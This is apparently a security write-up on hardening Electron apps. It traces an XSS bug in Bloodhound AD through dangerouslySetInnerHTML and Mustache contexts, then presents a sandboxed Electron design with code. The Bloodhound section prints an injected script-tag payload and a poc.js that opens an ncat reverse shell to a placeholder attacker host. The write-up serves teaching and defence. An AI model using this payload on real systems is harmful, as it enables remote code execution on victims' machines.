# Reasonably Secure Electron

_"In the face of ambiguity, refuse the temptation to guess."_ -The Zen of Python

Electron is often regarded as insecure by design. While this reputation is not entirely undeserved, application security is far more dependent upon engineering practices rather than the underlying framework. That is not to say the frameworks you choose have no bearing on security; it is possible to write secure PHP code, but [due to the language's often unintuative design it's not easy](https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/). Similarly it's possible to write secure Electron applications, though it may not always be easy for a variety of reasons we'll explore.

## Electron & Kin

[Electron](https://electronjs.org/) is a cross-platform framework for developing desktop applications using "web" technologies like HTML, JavaScript, and CSS. Electron has become very popular in recent years for its ease of use, empowering developers to quickly develope generally good looking, responsive, cross-platform desktop applications. Applications major tech companies like Microsoft Teams, VSCode, Slack, Atom, Spotify, and even secure messaging apps like Signal all use Electron or similar "native web" application frameworks. Electron did not start this trend, embedded webviews have been around for sometime. For example, iMessage is developed using embedded WebKit webviews, which have been [available on MacOS and iOS](https://developer.apple.com/documentation/webkit/wkwebview) for years. Similarly, JavaFX supports embedable WebKit and [Windows has IE objects](https://msdn.microsoft.com/en-us/windows/desktop/aa752084) that can be embedded in 3rd party applications.

There is however an important design change that occured with newer hipster Chrome-based frameworks like Electron and NodeWebKit; in the older frameworks the programmer generally had to selectively expose functionality or objects to the "web context" -that is the JavaScript execution context inside the webview. However, in Electron and kin the unsandboxed NodeJS APIs are _enabled by default_ and the developer must opt-out regardless if the application even uses such functionality.

## Out of the Browser Into the Fire

Since Electron applications are built on web application technologies, unsurprisingly they're often vulnerable to the same flaws found in your everyday web applciation. Whereas in the past web applications flaws have generally been confined to the browser's sandbox, no such limitations exist (by default) in Electron. This change has led to a significant increase in the impact a Cross-site Scripting (XSS) bug can have, since the attacker will gain access to the NodeJS APIs. Back in 2016 [Matt Bryant](https://twitter.com/IAmMandatory), [Shubs Shah](https://twitter.com/infosec_au), and I release some research on finding and exploiting these vulnerabilities in Electron and other native web frameworks. We demonstrating remote code execution vulnerabilities in Textual IRC, Azure Storage Explorer, and multiple markdown editors, as well as a flaw that allowed [remote disclosure of all iMessage data](https://know.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data) on MacOS, and created a cross-platform self-propegating worm in RocketChat in our presentation at [Kiwicon](https://www.kiwicon.org/).

But what is the root cause of XSS and why is it so hard to prevent? There's a common misconception that the proper fix for a Cross-site Scripting is sanitizing user input. The notation that sanitizing user input can concretely fix an XSS issue is untrue, the only proper fix for XSS is _contextual_ output encoding. That said, it's still a good idea to sanitize user input so do that too (and be sure you're sanatize using a whitelist, not a blacklist) --but you need to ensure it's done _in addition to proper output encoding_. A good rule of thumb is: "sanitize input, encode output," but what does "contextual encoding" entail? Let's explore the details of a couple recent exploits to better understand how XSS manifests and how to prevent it.

### Bloodhound AD

We'll first look at a couple vulnerabilities I found in the Bloodhound AD tool, one of which was independently discovered by [Fab](https://github.com/BloodHoundAD/BloodHound/issues/267).

Bloodhound is an incredibly powerful tool for analyzing the structure of Windows Active Directory deployments, and finding ways to exploit the various privilege relationships therein. The attacker (or defender) runs a ingestor script the dumps data from Active Directory into JSON, the JSON is the parsed into a Neo4j database and an Electron GUI can be used to query and view the results in a nice graph view. A quick look at the code reveals the application is primarily based on [React](https://reactjs.org/). React generally speaking, and for reasons we'll discuss later, is very good at preventing cross-site scripting attacks, but edge cases do exist. Such an edge case is the use of the `dangerouslySetInnerHTML()` function. This function is similar in functionality to a DOM element's `innerHTML()` function (also dangerous); the function takes in a string and parses it as HTML. 

Using canidate point analysis, a quick search of the unpatched [Bloodhound AD](https://github.com/BloodHoundAD/BloodHound/tree/a7ea5363870d925bc31d3a441a361f38b0aadd0b) codebase and we find four instances of this function being used, excerpt below:

#### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L1988)
```jsx
<Modal.Body>
  <Tabs
    defaultActiveKey={1}
    id='help-tab-container'
    justified
  >
  <Tab
    eventKey={1}
    title='Info'
    dangerouslySetInnerHTML={this.state.infoTabContent}
  />
```

In the excerpt above we can see an attribute of this `this.state` object is passed to our canidate point `dangerouslySetInnerHTML`, from this sink we'll trace backwords to determine if the issue is exploitable, and looking at the definition of `this.state` we can see that it's a basic JavaScript object initialized with empty strings, including the `.infoTabContent` attribute, which is passed as a parameter to our sink:

#### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L5)
```javascript
export default class HelpModal extends Component {
  constructor() {
    super();
    this.state = {
      open: false,
      infoTabContent: '',
      abuseTabContent: '',
      opsecTabContent: '',
      referencesTabContent: '',
    };
```

So next we must determine how `.infoTabContent` is set, jumping to the next usage of `infoTabContent` we find:

#### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L239)
```javascript
  this.setState({ infoTabContent: { __html: formatted } });
```

Here we see the empty string `infoTabContent` is replaced with a JavaScript object with the key `__html`, this aligns with [React's documentation](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml) of how `dangerouslySetInnerHTML` works and is a good indication we've correctly traced the code and this value is indeed passed to our sink. The `__html` key's value is the `formatted` variable. So from here we must determine what the variable is, and what it contains. Scrolling up a bit we can see that `formatted` is just a string, which is built using string interpolation with variables `${sournceName}` and `${targetName}`:

```javascript
} else if (edge.label === 'SQLAdmin'){
  formatted = `The user ${sourceName} is a SQL admin on the computer ${targetName}.

  There is at least one MSSQL instance running on ${targetName} where the user ${sourceName} is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.

  For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.
  
  Author: Scott Sutherland`;
}
```

Based on my usage and understanding of the tool, and as the help dialog helpfully points out, these values are based on data collected by the ingestor script from Active Directory i.e. from an 'untrusted' source, and therefor "attacker" controlled (note the ironic inversion of 'attacker' in this context). This confirms the exploitability of our canidate point, attacker controlled content is indeed passed to `dangerouslySetInnerHTML`. All an attacker needs to do is plant malicous values, such as a GPO as Fab demonstrated, with the following name:

```html
aaaaaa<SCRIPT SRC="http://example.com/poc.js">
```

Where `poc.js` contains:

```javascript
const { spawn } = require('child_process');
spawn('ncat', ['-e', '/bin/bash', '<attacker host>', '<some port>']);
```

Since the GPO name is not properly encoded it will be rendered by the DOM as HTML, and Electron will parse the `<SCRIPT` tag and dutifully retrieve and execute the context of `poc.js`. As discussed before, since the NodeJS APIs are enabled this attacker controlled JavaScript can simply spawn a bash child process and execute arbitrary native code on the machine.

A reasonable scenario here would be blue teams hiding malicous values in their AD deployment waiting for the red team to run Bloodhoud, and subsequently exploit the red team operator's machine. Though blue teams often also run this tool, so were a red team operator in a position to influence the data collected by Bloodhound, but otherwise had limited access to AD the exploit could go in the traditional direction too.

#### HTML Encoding

The most comprehensive fix for this vulnerability would be to re-write the functionality such that `dangerouslySetInnerHTML` is not needed, however from a practical perspective a lot of code would need to be refactored. A short term and effective fix is to HTML encode the attacker controlled variables. By HTML encoding these values, we can ensure these strings are never interpreted by the browser as actual HTML, and can support arbitrary characters. The prior payload `aaaaaa<SCRIPT SRC="http://example.com/poc.js">` will simply be displayed as `aaaaaa<SCRIPT SRC="http://example.com/poc.js">`. So is preventing cross-site scripting a simple matter of HTML encoding attacker controlled values? Unfortunately no.

In another area of the application the [Mustache](https://mustache.github.io/) template library is used to render tool tips. The Mustache library HTML encodes by default, another potential fix for the prior vulnerability would be to switch from string interpolation to Mustache templates. However, as we discussed the proper fix is _contextual encoding_, not blanket HTML encoding. HTML encoding will prevent XSS in an HTML context, but when used outside of an HTML context it will fail, or only coincidentally prevent XSS. 

Looking at the usage of Mustache in Bloodhound we see that a few values are passed to the tooltips, notably `label` is attacker controlled:

#### [`nodeTooltip.html`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/nodeTooltip.html)
```html
<div class="header">
  {{label}}
</div>
<ul class="tooltip-ul">
  {{#type_ou}}
  <li onclick="emitter.emit('setStart', '{{type}}:{{guid}}')">
    <i class="fa fa-map-marker-alt"></i> Set as Starting Node
  </li>
  <li onclick="emitter.emit('setEnd', '{{type}}:{{guid}}')">
    <i class="fa fa-bullseye"> </i> Set as Ending Node
  </li>
  {{/type_ou}}
  {{^type_ou}}
  <li onclick="emitter.emit('setStart', '{{type}}:{{label}}')">
    <i class="fa fa-map-marker-alt"></i> Set as Starting Node
  </li>
```

In the first usage, `{{label}}` is not vulnerable, since this is an HTML context i.e. the string we are rendering is within an HTML tag:

```html
<div class="header">
    {{label}}
</div>
```

The second instance of `{{label}}` though is used as part of an `onclick=` event, which is a JavaScript event triggered when a user clicks on the HTML tag. Therefore for the contents of `onclick=` will be parsed as JavaScript code:

```html
<li onclick="emitter.emit('setStart', '{{type}}:{{label}}')">
  <i class="fa fa-map-marker-alt"></i> Set as Starting Node
</li>
```

Note that `{{label}}` is rendered into the following JavaScript code snippet:

```javascript
emitter.emit('setStart', '{{type}}:{{label}}')
```

While Mustache will HTML encode the `label` variable, we're not rendering this variable in an HTML context since this will be interpreted by the browser as JavaScript. 

This is also why sanitizing user input can be a problematic fix for injection issues, it's rare that at the time of accepting user input we know exactly what context(s) the values will be used in later. For example, if we sanitized `label` for XSS by removing HTML control characters such as `<` and `>` we'd still be left with an exploitable XSS vulnerability. If we go further and remove `'`, `"`, `}`, and `)` are we certain there's not a third or even forth context where `label` is used that may be vulnerable? This also touches on why you should always use whitelist sanitization, not a blacklist as a whitelist will better account for unintended side effects. Furthermore, if these characters are valid in a GPO name and we reject GPO names that these characters we'll have a functionality issue in that we cannot properly display the name as intended. This is why proper encoding must be used to meet both our functional and security requirements.

### Signal

In 2018 [Iván Ariel Barrera Oro](https://twitter.com/HacKanCuBa), [Alfredo Ortega](https://twitter.com/ortegaalfredo), [Juliano Rizzo](https://twitter.com/julianor), and [Matt Bryant](https://twitter.com/IAmMandatory) found [multiple remote code execution flaws](https://thehackerblog.com/i-too-like-to-live-dangerously-accidentally-finding-rce-in-signal-desktop-via-html-injection-in-quoted-replies/) in Signal, a secure end-to-end encrypted messaging application.

Notably, these exploits bypassed the applicaiton's [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).



### What's in a Name?

A function by any other name could be so vulnable. The flaws in both Signal and Bloodhound AD stemmed from the use of [ReactJS](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)'s `dangerouslySetInnerHTML` function, which despite its name is seemingly used with reckless abandon, and not a 2nd thought as to why the React developers chose such a name. If developers from the security community consistently misuse these functions, what hope do developers without a security background have?

All of the aforementioned bugs are at their core Cross-site Scripting vulnerabilities (XSS), which is a terrible name. Cross-site Scripting is a actually a JavaScript _injection vulnerability_. All injection vulnerabilities occur when the "computer" cannot properly differenciate between what is data and what is an instruction, and subsequently allows an attacker to trick the "computer" into misinterpreting (attacker-controlled) data as instructions. This can be said about XSS, as well as SQL injection, command injection, etc. The core mechanics at of all these vulnerabilities are actually the same, save for what the "computer" is.

For example, the "computer" in a SQL injection is the SQL interpreter, and in the context of XSS the Document Object Model (DOM). If you've ever wondered the logical reason why prepared statements are not vulnerable to SQL injection, it is principally that in a prepared statement there is always a speratation of the query logic (instructions) from the data (parameters):

```php
$stmt = $conn->prepare("INSERT INTO Users (firstname, lastname, email) VALUES (?, ?, ?)");
$stmt->bind_param("sss", $firstname, $lastname, $email);
```

The logic (i.e. the query) is first passed to the `prepare()` function, then the data (i.e. parameters) are subsequently passed in a seperate `bind_param()` function call. This prevents any possibility of the database misinterpreting use controlled data as SQL instructions. However, an application that exclusively makes use of prepared statements is not automatically "secure," though it may be free of this one particular vulnerability, care still must be taken when designing an application --SQL injection is not the only vulnerability that can result in an attacker stealing data from the database.

## The Secure Road Not Taken

This is my attempt at making a _reasonably_ secure Electron application. High level design is:

* __Sandboxed__ - The main WebView does NOT have `nodeIntegration` enabled; the WebView cannot directly execute native code, access the file system, etc. it has to go thru the IPC interface to perform any actions a browser normally could not. The IPC interface is called via `window.postMessage()` with `contextIsolation` enabled so there are no direct references to Node objects within the sandbox.
* __No HTTP__ - The sandboxed code does not talk to the server over HTTP. Instead it uses IPC to talk to the native Node process, which then converts the call into RPC (Protobuf over mTLS). There are no locally running HTTP servers and thus no HTTP cross-origin conerns. However, [due to a bug in Electron](https://github.com/electron/electron/issues/19603) it's possible for plugin scripts to control URI parameters. So care must be take to ensure URI parameters cannot cause a state changing event.
* __CSP__ - Strong CSP by default: `default-src none`, no direct interaction with the DOM, Angular handles all content rendering.
* __Navigation__: Navigation and redirects are disabled in all windows.
* __App Origin__: No webviews run with a `file://` origin, nor an `http://` origin, etc. Webviews run in either a `null` origin (plugin scripts) or within an `app://foobar` origin. In combination with CSP, this means the main webview cannot access any `file:` or `http:` resources.


## Origin Security

We also want to avoid having the application execute within the `file:` origin, as we've discussed `file:` origins can be problematic and expose potential opertunities for attackers to bypass the CSP and load remote code. Futhermore, since `file:` URIs lack proper MIME types Electron will refuse to load ES6 modules from this origin. Therefore, we can both improve security and enable the use of modern ES6 modules at the same type by switching to a custom protocol.

This is done in Electron using `RegisterBufferProtocolRequest`, ironically all of the provided examples in the Electron documentation are vulnerable to path traversal, which would allow an attacker to read any file on the filesystem even if `nodeIntegration` is disabled. 

#### `app-protocol.ts`
```typescript
export function requestHandler(req: Electron.RegisterBufferProtocolRequest, next: ProtocolCallback) {
  const reqUrl = new URL(req.url);
  let reqPath = path.normalize(reqUrl.pathname);
  if (reqPath === '/') {
    reqPath = '/index.html';
  }
  const reqFilename = path.basename(reqPath);
  fs.readFile(path.join(DIST_PATH, reqPath), (err, data) => {
    const mimeType = mime(reqFilename);
    if (!err && mimeType !== null) {
      next({
        mimeType: mimeType,
        charset: charset(mimeType),
        data: data
      });
    } else {
      console.error(err);
      next({
        mimeType: null,
        charset: null,
        data: null
      });
    }
  });
}
```

## Sandboxed

From personal preference we'll use TypeScript, with a few execeptions where using TypeScript needlessly complicates the build process (e.g. `preload.js`).

#### `main.ts`
```typescript
const mainWindow = new BrowserWindow({
  webPreferences: {
    sandbox: true,
    webSecurity: true,
    contextIsolation: true,
    webviewTag: false,
    enableRemoteModule: false,
    allowRunningInsecureContent: false,
    nodeIntegration: false,
    nodeIntegrationInWorker: false,
    nodeIntegrationInSubFrames: false,
    nativeWindowOpen: false,
    safeDialogs: true,
    preload: path.join(__dirname, 'preload.js'),
  },
});
```

The preload script is just a small snippted of JavaScript:

#### `preload.js`
```javascript
const { ipcRenderer } = require('electron');

window.addEventListener('message', (event) => {
  try {
    const msg = JSON.parse(event.data);
    if (msg.type === 'request') {
      if (['client_'].some(prefix => msg.method.startsWith(prefix))) {
        ipcRenderer.send('ipc', msg);
      }
    }
  } catch (err) {
    console.error(err);
  }
});

ipcRenderer.on('ipc', (_, msg) => {
  try {
    if (msg.type === 'response' || msg.type === 'push') {
      window.postMessage(JSON.stringify(msg), '*');
    }
  } catch (err) {
    console.error(err);
  }
});
```


# Source Code

Source code is organized as follows:

* `main.ts` - Electron entrypoint.
* `preload.js` - Electron preload script used to bridge the sandbox code to the Node process.
* `ipc/` - Node IPC handler code, this translates messages from the `preload.js` script into RPC or local procedure calls that cannot be done from within the sandbox.
* `src/` - Angular source code (webview code).
